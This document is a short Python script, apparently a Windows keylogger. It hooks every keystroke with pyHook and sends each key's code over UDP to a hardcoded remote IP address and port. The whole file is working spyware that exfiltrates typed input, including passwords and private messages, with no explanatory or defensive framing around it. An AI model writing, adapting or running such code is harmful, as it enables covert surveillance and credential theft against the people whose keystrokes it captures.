import threading
import pythoncom
import pyHook
import os
import logging
from socket import *
host = "184.54.50.87" # set to IP address of target computer
port = 13000
addr = (host, port)
UDPSock = socket(AF_INET, SOCK_DGRAM)
def onKeyboardEvent(event):
    UDPSock.sendto(str(event.Ascii).encode(), addr)
    return True

hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=onKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()